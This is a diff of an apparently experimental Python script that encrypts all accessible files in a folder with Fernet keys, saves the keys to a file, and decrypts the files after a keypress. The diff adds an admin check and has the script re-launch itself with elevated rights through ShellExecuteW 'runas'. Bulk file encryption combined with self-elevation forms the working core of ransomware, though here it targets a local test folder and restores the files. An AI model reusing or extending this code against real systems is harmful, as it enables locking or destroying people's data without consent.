@@ -1,6 +1,8 @@
 import os
 import random
 import string
+import ctypes
+import sys
 
 from cryptography.fernet import Fernet
 
@@ -9,6 +11,13 @@ from cryptography.fernet import Fernet
 #   Run self with admin
 #   kill current self
 # Else continue
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
 
 
 def key_generator():
@@ -142,26 +151,34 @@ def key_memory(F_keys:[]):
 # print(f"The folder returned is : {files}")
 
 
-keys = []
-ash = []
-files = get_all_accessible_files_in_Dir('.\\encrypt_thing')
-folder_to_encrypt = '.\\encrypt_thing\\WAS2_Subnet_worksheet.docx'
-for i in range(1):
-    key = Fernet.generate_key() # key generator
-    cipher = Fernet(key) # hash the key
-    print(f'Key : {key.decode()}')
-    for e in files:
-        encrypt_file(e, cipher)
-    keys.append(key)
-test = input("press enter to remove encryption")
-num = len(keys)
+def main():
+    # Look if program is admin
+    if is_admin():
+        keys = []
+        files = get_all_accessible_files_in_Dir('.\\encrypt_thing')
+        folder_to_encrypt = '.\\encrypt_thing\\WAS2_Subnet_worksheet.docx'
+        for i in range(1):
+            key = Fernet.generate_key() # key generator
+            cipher = Fernet(key) # hash the key
+            print(f'Key : {key.decode()}')
+            for e in files:
+                encrypt_file(e, cipher)
+            keys.append(key)
+        test = input("press enter to remove encryption")
+        num = len(keys)
+
+        key_memory(keys)
+
+        the_word = Get_Key_from_file('password.txt')
+        while num > 0:
+            for e in files :
+                decrypt_file(e, the_word)
+            num = num - 1
+    else:
+        # Re-run the program with admin rights
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
 
-key_memory(keys)
-
-the_word = Get_Key_from_file('password.txt')
-while num > 0:
-    for e in files :
-        decrypt_file(e, the_word)
-    num = num - 1
+if __name__ == "__main__":
+    main()
 
